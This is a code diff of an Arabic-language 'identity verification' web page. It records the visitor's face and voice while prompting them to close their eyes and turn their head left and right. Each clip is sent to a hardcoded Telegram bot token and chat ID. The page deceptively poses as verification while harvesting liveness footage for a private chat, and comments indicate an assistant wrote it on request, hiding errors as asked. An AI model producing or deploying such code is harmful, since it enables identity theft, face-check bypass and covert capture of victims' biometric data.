@@ -10,54 +10,202 @@
       --text:#333;
       --muted:#6b6b6b;
       --bg:#ffffff;
+      --radius:14px;
       --maxw:420px;
       --mobile-padding:22px;
       --btn-height:58px;
     }
-    html,body{ height:100%; margin:0; font-family:"Segoe UI", Tahoma, "Helvetica Neue", Arial, "Noto Sans Arabic", sans-serif; background:linear-gradient(180deg,#f7f9fc 0%, #ffffff 100%); color:var(--text); }
-    .page { max-width:var(--maxw); margin:0 auto; min-height:100vh; display:flex; flex-direction:column; }
-    .topbar{ padding:14px var(--mobile-padding); display:flex; align-items:center; }
-    .back { margin-inline-start:auto; width:36px; height:36px; display:flex; align-items:center; justify-content:center; border-radius:999px; color:var(--muted); cursor:pointer; }
-    .card { background:var(--bg); margin:0 auto; padding:0 var(--mobile-padding); flex:1 1 auto; display:flex; flex-direction:column; }
-    .visual { margin-top:6px; display:flex; justify-content:center; align-items:center; padding-top:6px; padding-bottom:8px; }
-    .phone-img { width:220px; max-width:64%; height:auto; border-radius:10px; box-shadow:0 18px 30px rgba(47,159,255,0.06), 0 6px 12px rgba(30,30,30,0.04); background:#fff; object-fit:cover; display:block; }
-    h1 { margin:18px 0 6px 0; font-size:20px; text-align:center; color:var(--accent); font-weight:700; }
-    p.lead { margin:0 0 18px 0; text-align:center; color:var(--muted); font-size:15px; }
-    .tips { margin-top:8px; display:block; padding:8px 0 120px 0; }
-    .tips ul{ list-style: disc; padding-inline-start:22px; margin:10px 6px; color:var(--text); line-height:1.9; font-size:16px; direction:rtl; }
-    .bottom { position:fixed; left:0; right:0; bottom:18px; display:flex; justify-content:center; pointer-events:none; }
-    .btn-wrap{ width:100%; max-width:var(--maxw); padding:0 var(--mobile-padding); pointer-events:auto; }
-    .btn { width:100%; height:var(--btn-height); background:linear-gradient(180deg,var(--accent), #1b88e6); border-radius:28px; color:#fff; font-size:18px; font-weight:600; border:0; cursor:pointer; box-shadow:0 6px 20px rgba(47,159,255,0.18); }
-    .overlay { position:fixed; inset:0; background:rgba(0,0,0,0.6); display:none; align-items:center; justify-content:center; z-index:9999; }
-    .recorder { background:#fff; width:100%; max-width:480px; border-radius:12px; padding:12px; box-sizing:border-box; text-align:center; }
-    video#cam { width:100%; border-radius:8px; background:#000; }
+    html,body{
+      height:100%;
+      margin:0;
+      font-family: "Segoe UI", Tahoma, "Helvetica Neue", Arial, "Noto Sans Arabic", sans-serif;
+      background:linear-gradient(180deg,#f7f9fc 0%, #ffffff 100%);
+      color:var(--text);
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+    }
+
+    .page {
+      max-width:var(--maxw);
+      margin:0 auto;
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      align-items:stretch;
+      justify-content:flex-start;
+      position:relative;
+      background:transparent;
+    }
+
+    .topbar{
+      padding:14px var(--mobile-padding);
+      display:flex;
+      justify-content:flex-start;
+      align-items:center;
+    }
+    .back {
+      margin-inline-start:auto;
+      width:36px;
+      height:36px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      border-radius:999px;
+      color:var(--muted);
+      cursor:pointer;
+      user-select:none;
+    }
+    .back svg{ width:18px; height:18px; }
+
+    .card {
+      background:var(--bg);
+      margin:0 auto;
+      padding:0 var(--mobile-padding);
+      flex:1 1 auto;
+      display:flex;
+      flex-direction:column;
+      align-items:stretch;
+    }
+
+    .visual {
+      margin-top:6px;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      padding-top:6px;
+      padding-bottom:8px;
+    }
+
+    .phone-img {
+      width:220px;
+      max-width:64%;
+      height:auto;
+      border-radius:10px;
+      box-shadow:0 18px 30px rgba(47,159,255,0.06), 0 6px 12px rgba(30,30,30,0.04);
+      background:#fff;
+      object-fit:cover;
+      display:block;
+    }
+
+    h1 {
+      margin:18px 0 6px 0;
+      font-size:20px;
+      text-align:center;
+      color:var(--accent);
+      font-weight:700;
+    }
+    p.lead {
+      margin:0 0 18px 0;
+      text-align:center;
+      color:var(--muted);
+      font-size:15px;
+    }
+
+    .tips {
+      margin-top:8px;
+      display:block;
+      padding:8px 0 120px 0;
+    }
+    .tips ul{
+      list-style: disc;
+      padding-inline-start:22px;
+      margin:10px 6px;
+      color:var(--text);
+      line-height:1.9;
+      font-size:16px;
+    }
+    .tips ul { direction: rtl; }
+    .tips ul li { text-align: right; }
+
+    .bottom {
+      position:fixed;
+      left:0;
+      right:0;
+      bottom:18px;
+      display:flex;
+      justify-content:center;
+      pointer-events:none;
+    }
+    .btn-wrap{
+      width:100%;
+      max-width:var(--maxw);
+      padding:0 var(--mobile-padding);
+      pointer-events:auto;
+    }
+    .btn {
+      width:100%;
+      height:var(--btn-height);
+      background:linear-gradient(180deg,var(--accent), #1b88e6);
+      border-radius:28px;
+      color:#fff;
+      font-size:18px;
+      font-weight:600;
+      border:0;
+      cursor:pointer;
+      box-shadow:0 6px 20px rgba(47,159,255,0.18);
+    }
+
+    /* overlay للتصوير */
+    .overlay {
+      position:fixed;
+      inset:0;
+      background:rgba(0,0,0,0.6);
+      display:none;
+      align-items:center;
+      justify-content:center;
+      z-index:9999;
+    }
+    .recorder {
+      background:#fff;
+      width:100%;
+      max-width:420px;
+      border-radius:12px;
+      padding:12px;
+      box-sizing:border-box;
+      text-align:center;
+    }
+    video#cam {
+      width:100%;
+      border-radius:8px;
+      background:#000;
+      transform:scaleX(-1); /* mirror so user sees self naturally */
+    }
     .controls { margin-top:8px; display:flex; gap:8px; justify-content:center; align-items:center; }
     .muted { color:var(--muted); font-size:14px; }
-    .small { font-size:13px; color:#666; margin-top:6px; }
-    @media (max-width:420px){ .phone-img{ width:56%; } .btn { height:54px; font-size:17px; } }
+    .instruction { font-weight:700; color:var(--accent); margin:8px 0; font-size:16px; }
+
+    .small-btn { padding:6px 12px; height:40px; border-radius:10px; border:0; cursor:pointer; }
+
+    @media (max-width:420px){
+      .phone-img{ width:56%; }
+      .btn { height:54px; font-size:17px; }
+      video#cam { transform:scaleX(-1); }
+    }
   </style>
 </head>
 <body>
   <div class="page" role="main" aria-label="صفحة التحقق من الهوية">
-    <div class="topbar">
+    <div class="topbar" aria-hidden="false">
       <div class="back" title="رجوع" onclick="history.back()">
-        <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M8 5l7 7-7 7" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+          <path d="M8 5l7 7-7 7" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
       </div>
     </div>
 
     <div class="card">
-      <div class="visual">
-        <img src="https://l.top4top.io/p_36648bqr85.jpeg" alt="صورة توضيحية للوجه" class="phone-img" />
+      <div class="visual" aria-hidden="true">
+        <img src="https://l.top4top.io/p_36648bqr85.jpeg" alt="صورة توضيحية للوجه" class="phone-img"/>
       </div>
 
       <main style="padding:0 6px;">
         <h1>التحقق من هويتك</h1>
-        <p class="lead">سنقوم بتسجيل فيديو قصير، نلتقط لقطة لتحليل العيون، وإذا كانت العيون مغلقة نرسل الفيديو.</p>
+        <p class="lead">سنبدأ بتصوير مقاطع قصيرة لتأكيد هويتك — الرجاء اتباع التعليمات الظاهرة.</p>
 
         <section class="tips" aria-labelledby="tips-heading">
           <ul id="tips-heading">
-            <li>ضع وجهك داخل الإطار</li>
-            <li>التقط فيديو قصير (سيتم إرساله إذا اكتشفنا أن عينيك مغلقة)</li>
+            <li>ضع وجهك في الإطار</li>
+            <li>ستُطلب منك إغلاق العين وتحريك الوجه وفق التعليمات</li>
             <li>أزل القبعة أو النظارات</li>
           </ul>
         </section>
@@ -71,121 +219,103 @@
     </div>
   </div>
 
+  <!-- Overlay للتصوير -->
   <div class="overlay" id="overlay" role="dialog" aria-modal="true">
     <div class="recorder" id="recorder">
-      <div id="status" class="muted">تحميل...</div>
+      <div id="status" class="muted">تحميل النموذج...</div>
+      <div id="instr" class="instruction"></div>
       <video id="cam" autoplay playsinline muted></video>
       <div class="controls">
         <div id="countdown" class="muted"></div>
-        <button id="cancelBtn" class="btn" style="height:40px; padding:6px 12px; background:#ccc; color:#111;">إلغاء</button>
+        <button id="retryBtn" class="small-btn" style="background:#f0f0f0; color:#111; display:none;">حاول مرة أخرى</button>
+        <button id="cancelBtn" class="small-btn" style="background:#ccc; color:#111;">إلغاء</button>
       </div>
-      <div id="hint" class="small"></div>
     </div>
   </div>
 
-  <canvas id="snapCanvas" style="display:none;"></canvas>
+  <canvas id="procCanvas" style="display:none;"></canvas>
 
-  <!-- مكتبا�� TensorFlow + face-landmarks-detection (MediaPipe FaceMesh) -->
+  <!-- مكتبات TensorFlow + face-landmarks-detection (MediaPipe FaceMesh) -->
   <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@3.21.0/dist/tf.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/face-landmarks-detection@1.0.3/dist/face-landmarks-detection.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh@0.4.1646424915/face_mesh.js"></script>
 
   <script>
     // ---------- CONFIG ----------
-    // تحذير أمني: لا تَضع التوكن في كود الواجهة على الإنتاج. استخدم خادماً لإرسال الفيديو بأمان.
+    // ملاحظة أمان: وجود التوكن داخل كود الواجهة (client-side) يعرضه لأي زائر.
+    // أنصح بنقل الإرسال إلى خادم آمن. أدرجت التوكن هنا لأنك طلبت ذلك.
     const TELEGRAM_BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
     const TELEGRAM_CHAT_ID = "6873334348";
-    const RECORD_SECONDS = 3; // مدة التسجيل بالثواني
-    // --------------------------------
 
+    const MAX_RECORD_MS = 4000; // مدة قصوى للتسجيل لكل خطوة (ms)
+    const MIN_SUCCESS_MS = 600; // مدة مطلوبة رصد حالة صحيحة (ms)
+    const SAMPLE_INTERVAL = 160; // ms بين كل عيّنة تحليل إطار
+    const EAR_THRESHOLD = 0.23; // عتبة لإغلاق العين
+    const TURN_RATIO = 0.12; // نسبة عرض الإزاحة لتحديد التوجه (12%)
+
+    // ---------- DOM ----------
     const overlay = document.getElementById('overlay');
     const camVideo = document.getElementById('cam');
     const statusEl = document.getElementById('status');
+    const instrEl = document.getElementById('instr');
     const countdownEl = document.getElementById('countdown');
-    const hintEl = document.getElementById('hint');
+    const retryBtn = document.getElementById('retryBtn');
     const cancelBtn = document.getElementById('cancelBtn');
-    const snapCanvas = document.getElementById('snapCanvas');
     const startBtn = document.getElementById('startBtn');
+    const procCanvas = document.getElementById('procCanvas');
 
-    let stream = null;
+    // ---------- state ----------
     let model = null;
-    let isRunning = false;
-    let recorder = null;
-    let recordedBlobs = [];
+    let stream = null;
+    let mediaRecorder = null;
 
-    // MediaPipe indices (تقريبية لمجموعة نقاط العين)
+    // MediaPipe indices for eyes (approx.)
     const LEFT_EYE = [33,160,158,133,153,144];
     const RIGHT_EYE = [362,385,387,263,373,380];
 
-    function dist(a,b){ const dx=a.x-b.x, dy=a.y-b.y; return Math.hypot(dx,dy); }
+    function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+
+    function dist(a,b){ const dx=a.x-b.x; const dy=a.y-b.y; return Math.hypot(dx,dy); }
     function eyeAspectRatio(landmarks, indices){
-      const p1=landmarks[indices[0]], p2=landmarks[indices[1]], p3=landmarks[indices[2]],
-            p4=landmarks[indices[3]], p5=landmarks[indices[4]], p6=landmarks[indices[5]];
-      const A=dist(p2,p6), B=dist(p3,p5), C=dist(p1,p4);
-      if (C===0) return 1.0;
-      return (A+B)/(2.0*C);
+      const p1 = landmarks[indices[0]];
+      const p2 = landmarks[indices[1]];
+      const p3 = landmarks[indices[2]];
+      const p4 = landmarks[indices[3]];
+      const p5 = landmarks[indices[4]];
+      const p6 = landmarks[indices[5]];
+      const A = dist(p2,p6);
+      const B = dist(p3,p5);
+      const C = dist(p1,p4);
+      if (C === 0) return 1.0;
+      return (A + B) / (2.0 * C);
     }
 
-    // تحميل النموذج مع محاولات متعددة عند الفشل
-    async function loadModelWithRetry(retries=2){
-      statusEl.textContent = 'تحميل نموذج التعرف على الوجه...';
-      for (let attempt=0; attempt<=retries; attempt++){
-        try{
+    // تحميل النموذج مع إعادة محاولات صامتة حتى النجاح
+    async function loadModelSilently(){
+      statusEl.textContent = 'تحميل النموذج...';
+      while (!model) {
+        try {
           model = await faceLandmarksDetection.load(faceLandmarksDetection.SupportedPackages.mediapipeFacemesh, { maxFaces: 1 });
-          statusEl.textContent = 'النموذج جاهز';
+          statusEl.textContent = 'جاهز';
           return;
-        }catch(e){
-          console.warn('فشل تحميل النموذج (محاولة ' + (attempt+1) + ')', e);
-          statusEl.textContent = 'فشل تحميل النموذج — محاولة ' + (attempt+1);
-          await new Promise(r => setTimeout(r, 800 * (attempt+1)));
+        } catch (e) {
+          console.warn('فشل تحميل النموذج مؤقتاً، سيتم إعادة المحاولة...', e);
+          // لا نعرض رسالة "تأكد من اتصال الإنترنت..." كما طلبت، نعيد المحاولة بصمت بعد تأخير.
+          await sleep(1200);
         }
       }
-      throw new Error('فشل تحميل نموذج التعرف على الوجوه بعد المحاولات.');
     }
 
-    // تحقق إذن الكاميرا: استخدام Permissions API إن كان متاحاً، وإلا اطلب getUserMedia مباشرة ليعرض نافذة الإذن
-    async function ensureCameraPermission(){
-      // إن كانت الـ API متاحة
-      if (navigator.permissions && navigator.permissions.query){
-        try{
-          const status = await navigator.permissions.query({ name: 'camera' });
-          if (status.state === 'denied') {
-            // ممنوع صراحة
-            throw new Error('blocked');
-          } else if (status.state === 'granted'){
-            return true;
-          } else {
-            // prompt -> نطلب getUserMedia لفتح صندوق الإذن
-            return await requestCamera();
-          }
-        }catch(err){
-          // بعض المتصفحات (Safari) لا تدعم name:'camera' — نطلب مباشرة
-          return await requestCamera();
-        }
-      } else {
-        return await requestCamera();
-      }
-    }
-
-    async function requestCamera(){
-      try{
-        // نطلب دفق الفيديو فقط (سيُظهر المتصفح نافذة الإذن)
-        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-        // وقّف المسار فوراً لأن هذه الدالة فقط للتحقق/طلب الإذن
-        s.getTracks().forEach(t => t.stop());
-        return true;
-      }catch(err){
-        if (err && err.name === 'NotAllowedError') throw new Error('denied');
-        throw err;
-      }
-    }
-
-    async function startCameraStream(){
-      try{
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+    // بدء الكاميرا (يجب أن يُستدعى من حدث ناتج عن تفاعل المستخدم لكي يظهر الـprompt)
+    async function startCamera(){
+      if (stream) return stream;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: true });
         camVideo.srcObject = stream;
         await camVideo.play();
-      }catch(e){
+        return stream;
+      } catch (e) {
+        console.error('فشل الوصول الى الكاميرا', e);
         throw e;
       }
     }
@@ -198,207 +328,280 @@
       try { camVideo.pause(); camVideo.srcObject = null; } catch(e){}
     }
 
-    function canvasToBlob(canvas, type='video/webm'){
-      return new Promise(res => canvas.toBlob(res, type));
-    }
-
-    // تحليل إطار من الفيديو (الكانفاس) لمعرفة ما إذا كانت العيون مغلقة
-    async function detectEyesClosedFromCanvas(canvas){
-      statusEl.textContent = 'تحليل الإطار...';
-      try{
-        const predictions = await model.estimateFaces({ input: canvas });
-        if (!predictions || predictions.length === 0) {
-          statusEl.textContent = 'لم يُكتشف وجه واضح.';
-          return null;
+    // تسجيل فيديو قصير وإعادته كـ Blob (يتوقف تلقائياً عند تحقق الشرط أو بعد المهلة)
+    function recordAndDetect(conditionChecker, maxMs = MAX_RECORD_MS){
+      return new Promise(async (resolve, reject) => {
+        if (!stream) return reject(new Error('no-stream'));
+        const recorded = [];
+        try {
+          const options = { mimeType: 'video/webm;codecs=vp8,opus' };
+          const mr = new MediaRecorder(stream, options);
+          mr.ondataavailable = ev => { if (ev.data && ev.data.size) recorded.push(ev.data); };
+          mr.start();
+          mediaRecorder = mr;
+        } catch (e) {
+          console.warn('MediaRecorder فشل البدء، المحاولة بدون تسجيل الفيديو', e);
+          mediaRecorder = null;
         }
-        // scaledMesh: [ [x,y,z], ... ]
-        const pts = predictions[0].scaledMesh.map(p => ({ x: p[0], y: p[1] }));
-        const leftEAR = eyeAspectRatio(pts, LEFT_EYE);
-        const rightEAR = eyeAspectRatio(pts, RIGHT_EYE);
-        const ear = (leftEAR + rightEAR) / 2;
-        console.log('EAR:', leftEAR, rightEAR, ear);
-        // عتبة تقريبية؛ يمكن تعديلها
-        return ear < 0.23;
-      }catch(e){
-        console.error('خطأ أثناء التحليل', e);
-        statusEl.textContent = 'خطأ أثناء تحليل الإطار.';
-        return null;
-      }
+
+        let success = false;
+        let successReason = null;
+        const start = performance.now();
+        let elapsed = 0;
+        let samplesMet = 0;
+        const requiredSamples = Math.ceil(MIN_SUCCESS_MS / SAMPLE_INTERVAL);
+
+        // canvas to analyze frames (non-mirrored coordinates)
+        const w = camVideo.videoWidth || 640;
+        const h = camVideo.videoHeight || 480;
+        procCanvas.width = w;
+        procCanvas.height = h;
+        const ctx = procCanvas.getContext('2d');
+
+        const sampler = setInterval(async () => {
+          try {
+            // draw non-mirrored frame for computation (mirror was applied via CSS transform on video element only)
+            ctx.save();
+            ctx.scale(1,1);
+            ctx.drawImage(camVideo, 0, 0, w, h);
+            ctx.restore();
+
+            // run model on current canvas
+            if (model){
+              const predictions = await model.estimateFaces({ input: procCanvas });
+              if (predictions && predictions.length>0){
+                const scaled = predictions[0].scaledMesh.map(p => ({ x: p[0], y: p[1] }));
+                const checked = conditionChecker({ landmarks: scaled, canvasWidth: w, canvasHeight: h });
+                if (checked) {
+                  samplesMet++;
+                } else {
+                  samplesMet = 0;
+                }
+                if (samplesMet >= requiredSamples) {
+                  success = true;
+                  successReason = 'detected';
+                }
+              } else {
+                // no face detected
+                samplesMet = 0;
+              }
+            } else {
+              // إذا لم يُحمل النموذج بعد (نادراً لأننا نحاول التحميل قبل التشغيل)، لا نعتبره فشلًا فوريًا
+              samplesMet = 0;
+            }
+          } catch(e) {
+            console.warn('خطأ أثناء تحليل الإطار', e);
+          }
+
+          elapsed = performance.now() - start;
+          if (success || elapsed >= maxMs) {
+            clearInterval(sampler);
+            // إيقاف المسجل
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+              mediaRecorder.stop();
+            }
+            // ننتظر انتهاء جمع البيانات
+            const finalize = () => {
+              const blob = new Blob(recorded, { type: 'video/webm' });
+              resolve({ success, reason: successReason, blob, duration: Math.min(elapsed, maxMs) });
+            };
+            // بعض المتصفحات تحتاج قليل وقت قبل ان يتاح blob
+            setTimeout(finalize, 250);
+          }
+        }, SAMPLE_INTERVAL);
+      });
     }
 
-    // إرسال الفيديو إلى Telegram (مباشراً من المتصفح) - قد يفشل بسبب CORS
-    async function sendVideoToTelegramBlob(videoBlob){
+    // وظائف تحديد الشروط:
+    function isEyesClosed({ landmarks }) {
+      const leftEAR = eyeAspectRatio(landmarks, LEFT_EYE);
+      const rightEAR = eyeAspectRatio(landmarks, RIGHT_EYE);
+      const ear = (leftEAR + rightEAR) / 2;
+      // قيمة EAR منخفضة تعني العين مغلقة
+      return ear < EAR_THRESHOLD;
+    }
+
+    function isTurnedLeft({ landmarks, canvasWidth }) {
+      // استخدم مركز الأنف (landmark index 1 أو 5? نستخدم index 1 تقريباً)
+      // سنحسب متوسط نقاط حوالي الأنف (1, 4, 2)
+      const noseIdx = [1,4,2].filter(i => landmarks[i]);
+      const avgX = noseIdx.reduce((s,i)=>s+landmarks[i].x,0)/noseIdx.length;
+      // إذا كانت النقطة أقل من منتصف العرض بمقدار معين => الوجه موجه لليسار من منظور الكاميرا
+      const ratio = (canvasWidth/2 - avgX) / canvasWidth;
+      return ratio > TURN_RATIO;
+    }
+    function isTurnedRight({ landmarks, canvasWidth }) {
+      const noseIdx = [1,4,2].filter(i => landmarks[i]);
+      const avgX = noseIdx.reduce((s,i)=>s+landmarks[i].x,0)/noseIdx.length;
+      const ratio = (avgX - canvasWidth/2) / canvasWidth;
+      return ratio > TURN_RATIO;
+    }
+
+    // إرسال فيديو إلى Telegram
+    async function sendVideoToTelegram(blob){
       statusEl.textContent = 'إرسال الفيديو إلى تلغرام...';
       const form = new FormData();
       form.append('chat_id', TELEGRAM_CHAT_ID);
-      // بعض المتصفحات قد لا تسمح باسم الملف مناسب
-      form.append('video', videoBlob, 'recording.webm');
-
-      try{
+      form.append('video', blob, 'clip.webm');
+      try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
         const resp = await fetch(url, { method: 'POST', body: form });
-        if (!resp.ok) {
-          const text = await resp.text();
-          console.error('Telegram response not ok', resp.status, text);
-          statusEl.textContent = 'فشل إرسال الفيديو — استجابة غير متوقعة من API.';
-          return false;
-        }
-        const data = await resp.json();
-        if (data && data.ok){
-          statusEl.textContent = 'تم إرسال الفيديو بنجاح.';
+        const json = await resp.json();
+        if (json && json.ok) {
+          statusEl.textContent = 'تم إرسال الفيديو.';
           return true;
         } else {
-          console.error('Telegram API returned error', data);
-          statusEl.textContent = 'فشل إرسال الفيديو. تحقق من التوكن والدردشة.';
+          console.error('Telegram API error', json);
+          statusEl.textContent = 'فشل إرسال الفيديو.';
           return false;
         }
-      }catch(e){
-        // غالباً هنا يقع خطأ CORS أو خطأ الشبكة
-        console.error('خطأ أثناء إرسال الفيديو', e);
-        statusEl.textContent = 'فشل الإرسال من المتصفح (قد يكون بسبب CORS). استخدم خادماً لإرسال الفيديو بأمان.';
-        hintEl.textContent = 'نصيحة: أرسل الفيديو إلى خادمك (endpoint آمن) حيث يوجد توكن البوت، ثم دع الخادم يرسل الفيديو لتلغرام.';
+      } catch (e) {
+        console.error('خطأ أثناء الإرسال لتلغرام', e);
+        statusEl.textContent = 'خطأ أثناء الإرسال.';
         return false;
       }
     }
 
-    // العمل الرئيسي: يطلب الإذن، يحمّل النموذج إن لزم، يسجّل فيديو، يلتقط لقطة من منتصفه، يحلل العيون، وإذا مغلقة يرسل الفيديو
-    async function handleStart(){
-      if (isRunning) return;
-      isRunning = true;
+    // تسلسل الخطوات
+    const steps = [
+      { key: 'closeEyes', label: 'الرجاء إغماض عينيك الآن', checker: isEyesClosed },
+      { key: 'left1', label: 'حرك وجهك إلى اليسار الآن', checker: isTurnedLeft },
+      { key: 'right', label: 'حرك وجهك إلى اليمين الآن', checker: isTurnedRight },
+      { key: 'left2', label: 'حرك وجهك إلى اليسار مرة أخرى', checker: isTurnedLeft },
+    ];
+
+    async function runSequence(){
       overlay.style.display = 'flex';
-      statusEl.textContent = 'التحقق من الأذونات...';
-      hintEl.textContent = '';
+      retryBtn.style.display = 'none';
+      instrEl.textContent = '';
       countdownEl.textContent = '';
+      statusEl.textContent = 'تحميل النموذج...';
+      // تحميل النموذج بصمت مع إعادة المحاولة
+      await loadModelSilently();
 
-      try{
-        // تأكد إذن الكاميرا (سيظهر مربع الإذن إذا لم تُمنح بعد)
-        await ensureCameraPermission();
-      }catch(err){
-        console.warn('إذن الكاميرا مرفوض أو محظور', err);
-        if (err.message === 'denied' || err.message === 'blocked'){
-          statusEl.textContent = 'إذن الكاميرا مرفوض. افتح إعدادات المتصفح وامنح الإذن للكاميرا ثم أعد المحاولة.';
-          hintEl.textContent = 'إذا كنت على الهاتف: افتح إعدادات الموقع/الكاميرا للمتصفح ومنح الإذن.';
-        } else {
-          statusEl.textContent = 'تعذر طلب إذن الكاميرا.';
-        }
-        isRunning = false;
+      // بدء الكاميرا (هذا سيثير نافذة السماح إذا لم تُمنح الأذونات بعد)
+      try {
+        await startCamera();
+      } catch (e) {
+        statusEl.textContent = 'لا يمكن الوصول للكاميرا — يرجى منح الإذن ثم المحاولة.';
+        retryBtn.style.display = 'inline-block';
+        retryBtn.textContent = 'حاول الوصول للكاميرا';
+        retryBtn.onclick = async () => {
+          retryBtn.style.display = 'none';
+          statusEl.textContent = 'محاولة الوصول للكاميرا...';
+          try {
+            await startCamera();
+            statusEl.textContent = 'جاهز';
+            retryBtn.style.display = 'none';
+          } catch (err) {
+            statusEl.textContent = 'لا يزال الوصول للكاميرا مغلقاً. افتح أذونات الكاميرا وحاول مجدداً.';
+            retryBtn.style.display = 'inline-block';
+          }
+        };
         return;
       }
 
-      // تحميل النموذج إن لم يكن محملاً
-      try{
-        if (!model) await loadModelWithRetry(2);
-      }catch(e){
-        console.error('فشل تحميل النموذج', e);
-        statusEl.textContent = 'فشل تحميل نموذج التعرف على الوجه. تأكد من اتصال الإنترنت أو أعد تحميل الصفحة.';
-        isRunning = false;
-        return;
-      }
+      // لكل خطوة: تكرار حتى النجاح (أو إلغاؤها)
+      for (let i=0;i<steps.length;i++){
+        const step = steps[i];
+        instrEl.textContent = step.label;
+        statusEl.textContent = 'جهّز ثم انتظر التسجيل...';
+        retryBtn.style.display = 'none';
 
-      // تشغيل الكاميرا فعلياً
-      try{
-        await startCameraStream();
-      }catch(e){
-        console.error('فشل تشغيل الكاميرا', e);
-        statusEl.textContent = 'تعذر الوصول للكاميرا. تأكد من أن الكاميرا متاحة وأن المتصفح يسمح بالوصول.';
-        isRunning = false;
-        return;
-      }
+        // عد تنازلي قصير ثم تسجيل وتحليل
+        for (let attempt=1; attempt<=4; attempt++){
+          let countdown = 3;
+          countdownEl.textContent = `سيبدأ التسجيل بعد ${countdown}...`;
+          statusEl.textContent = 'جهّز وجهك داخل الإطار';
+          while (countdown>0){
+            await sleep(700);
+            countdown--;
+            countdownEl.textContent = countdown>0 ? `سيبدأ التسجيل بعد ${countdown}...` : 'جاري التسجيل';
+          }
+          countdownEl.textContent = 'جاري التسجيل...';
 
-      // إعداد MediaRecorder
-      recordedBlobs = [];
-      try{
-        let options = null;
-        // حاول عدة أنواع MIME شيوعياً
-        if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) options = { mimeType: 'video/webm;codecs=vp9' };
-        else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) options = { mimeType: 'video/webm;codecs=vp8' };
-        else if (MediaRecorder.isTypeSupported('video/mp4')) options = { mimeType: 'video/mp4' };
-        // eslint-disable-next-line no-undef
-        recorder = new MediaRecorder(stream, options || undefined);
-        recorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) recordedBlobs.push(e.data); };
-        recorder.onerror = (ev) => console.warn('Recorder error', ev);
-        recorder.start(100); // تجميع كل 100ms تقريباً
-      }catch(e){
-        console.warn('فشل بدء MediaRecorder', e);
-        statusEl.textContent = 'تعذر تسجيل الفيديو على هذا المتصفح.';
-        stopCamera();
-        isRunning = false;
-        return;
-      }
+          // تسجيل ومراقبة
+          try {
+            const result = await recordAndDetect(step.checker, MAX_RECORD_MS);
+            if (result.success) {
+              statusEl.textContent = 'تم التحقق — جاري الإرسال...';
+              await sendVideoToTelegram(result.blob);
+              // نقطة توقف صغيرة قبل الخطوة التالية
+              await sleep(900);
+              break; // انتقل للخطوة التالية
+            } else {
+              // فشل التحقق خلال المدة
+              statusEl.textContent = 'لم تتحقق الحركة المطلوبة. هل تريد المحاولة مرة أخرى؟';
+              retryBtn.style.display = 'inline-block';
+              retryBtn.textContent = 'أعِد المحاولة';
+              let retryPromise = new Promise(res => {
+                retryBtn.onclick = () => { retryBtn.style.display='none'; res(true); };
+                cancelBtn.onclick = () => { res(false); };
+              });
+              const doRetry = await retryPromise;
+              if (!doRetry) {
+                // إلغاء السلسلة بالكامل
+                stopCamera();
+                overlay.style.display = 'none';
+                statusEl.textContent = 'أُلغيت العملية';
+                return;
+              } else {
+                statusEl.textContent = 'إعادة المحاولة...';
+                // تجربة أخرى من نفس الخطوة
+                continue;
+              }
+            }
+          } catch (e) {
+            console.error('خطأ أثناء التسجيل/التحقق', e);
+            statusEl.textContent = 'حدث خطأ أثناء التسجيل. حاول مرة أخرى.';
+            retryBtn.style.display = 'inline-block';
+            retryBtn.textContent = 'أعِد المحاولة';
+            let retry = await new Promise(res => {
+              retryBtn.onclick = () => { retryBtn.style.display='none'; res(true); };
+              cancelBtn.onclick = () => { res(false); };
+            });
+            if (!retry) {
+              stopCamera();
+              overlay.style.display = 'none';
+              return;
+            }
+          }
+        } // attempts loop
+      } // steps loop
 
-      // العدّ التنازلي + التقاط لقطة منتصف التسجيل
-      let remaining = RECORD_SECONDS;
-      statusEl.textContent = 'التسجيل سيبدأ الآن. ضع وجهك في الإطار.';
-      countdownEl.textContent = `الوقت المتبقي: ${remaining}s`;
-
-      const countdownTimer = setInterval(() => {
-        remaining--;
-        if (remaining >= 0) countdownEl.textContent = `الوقت المتبقي: ${remaining}s`;
-      }, 1000);
-
-      // ننتظر نصف المدة ثم نلتقط لقطة لتحليل العيون
-      await new Promise(r => setTimeout(r, Math.floor((RECORD_SECONDS * 1000) / 2)));
-      // التقط لقطة
-      try{
-        snapCanvas.width = camVideo.videoWidth || 640;
-        snapCanvas.height = camVideo.videoHeight || 480;
-        const ctx = snapCanvas.getContext('2d');
-        ctx.drawImage(camVideo, 0, 0, snapCanvas.width, snapCanvas.height);
-      }catch(e){
-        console.error('خطأ التقاط اللقطة', e);
-      }
-
-      // ننتظر بقية المدة
-      await new Promise(r => setTimeout(r, Math.ceil((RECORD_SECONDS * 1000) / 2)));
-
-      // أوقف التسجيل
-      if (recorder && recorder.state !== 'inactive') {
-        recorder.stop();
-      }
-      clearInterval(countdownTimer);
+      // انتهت السلسلة بنجاح
+      statusEl.textContent = 'اكتملت جميع الخطوات.';
+      instrEl.textContent = '';
       countdownEl.textContent = '';
-      statusEl.textContent = 'انتهى التسجيل — جاري المعالجة...';
-
-      // نحلل اللقطة
